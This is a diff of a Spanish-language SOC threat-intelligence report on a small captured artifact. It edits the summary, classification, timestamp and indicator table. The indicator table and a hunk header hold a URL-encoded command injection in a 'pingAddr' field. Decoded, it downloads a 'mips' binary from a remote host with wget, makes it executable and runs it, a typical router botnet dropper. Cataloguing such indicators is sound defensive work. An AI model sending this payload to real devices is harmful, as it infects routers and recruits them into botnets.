@@ -4,16 +4,16 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Payload** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Cambio de permisos. Se asoció 1 comando observado o extraído.
+Artefacto de 191 B. Formato identificado como ASCII text, with no line terminators. Entropía registrada: 5.00. No existe evidencia suficiente para atribuir este artefacto a una familia concreta. Comportamientos destacados: Descarga remota, Cambio de permisos. Se identificó 1 comando observado o extraído. Se identificaron 2 indicadores técnicos.
+
 
 ## 🏷️ Clasificación
 
-- **Categoría:** `Payload`
 - **Riesgo:** `Medium`
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T20:46:43+00:00`
+- **Registrado:** `2026-08-09T20:46:43.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -50,8 +50,8 @@ pingAddr=%60cd+%2Ftmp%3Brm+mips%3B+wget+http%3A%2F%2Fsmart.abuse.st%2Fmips%3B+ch
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| hash | dee456281d4564edb89f0a52dd43d26a0a26502bd4f352bfe8d0d814a8032d14 | static_analysis |
 | command | pingAddr=%60cd+%2Ftmp%3Brm+mips%3B+wget+http%3A%2F%2Fsmart.abuse.st%2Fmips%3B+chmod+777+%2A%3B+.%2Fmips+warautalkinabout | strings |
+| hash | dee456281d4564edb89f0a52dd43d26a0a26502bd4f352bfe8d0d814a8032d14 | static_analysis |
 | ip | 162.198.15.XXX | artifact_source |
 
 ## 🔎 Triage
